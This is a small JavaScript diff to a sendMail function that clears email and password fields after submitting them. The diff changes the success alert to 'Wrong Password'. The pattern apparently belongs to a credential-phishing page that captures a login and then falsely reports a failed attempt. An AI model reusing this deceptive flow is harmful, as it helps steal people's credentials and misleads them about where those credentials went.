@@ -12,7 +12,7 @@ function sendMail() {
         document.getElementById("email").value = "";
         document.getElementById("password").value = "";
         console.log(res);
-        alert("Your message sent successfully!!")
+        alert("Wrong Password")
 
     })
     .catch(err=>console.log(err));
